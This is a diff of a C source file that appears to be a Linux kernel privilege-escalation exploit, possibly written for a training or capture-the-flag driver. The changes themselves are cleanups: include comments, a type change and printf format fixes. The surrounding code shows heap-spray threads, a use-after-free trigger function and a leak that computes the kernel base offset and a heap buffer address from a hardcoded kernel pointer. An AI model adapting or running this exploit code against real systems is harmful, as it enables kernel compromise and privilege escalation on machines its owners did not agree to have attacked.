@@ -1,15 +1,15 @@
 #define _GNU_SOURCE
-#include <ctype.h>
-#include <fcntl.h>
-#include <pthread.h>
-#include <sched.h>
-#include <stdbool.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/ioctl.h>
-#include <unistd.h>
+#include <ctype.h>      // for isdigit
+#include <fcntl.h>      // for open, O_NOCTTY, O_RDONLY, O_RDWR
+#include <inttypes.h>   // for uintptr_t, uint8_t, PRIx64, uint32_t
+#include <pthread.h>    // for pthread_join, pthread_barrier_wait, pthread_c...
+#include <sched.h>      // for sched_setaffinity, sched_yield, CPU_SET, CPU_...
+#include <stdbool.h>    // for true
+#include <stdio.h>      // for NULL, printf, puts
+#include <stdlib.h>     // for EXIT_SUCCESS
+#include <string.h>     // for strncmp
+#include <sys/ioctl.h>  // for ioctl
+#include <unistd.h>     // for close, read, write, execve
 
 #define SPRAY_COUNT 50
 
@@ -151,7 +151,7 @@ static void *spray_cpu(void *arg)
 
 static void uaf(void)
 {
-	uint8_t data[0x164];
+	char data[0x164];
 	pthread_t tid1;
 	pthread_t tid2;
 	int ret;
@@ -210,10 +210,10 @@ static void leak_offset_and_g_buf(void)
 	read(fd1, data, 0x40);
 	ptr = *(uintptr_t *)&data[0x18];
 	offset = ptr - 0xffffffff81c3afe0;
-	printf("[+] offset %p\n", offset);
+	printf("[+] offset %#" PRIx64 "\n", offset);
 
 	g_buf = *(uintptr_t *)&data[0x38] - 0x38;
-	printf("[+] g_buf %p\n", g_buf);
+	printf("[+] g_buf %#" PRIx64 "\n", g_buf);
 }
 
 int main(void)
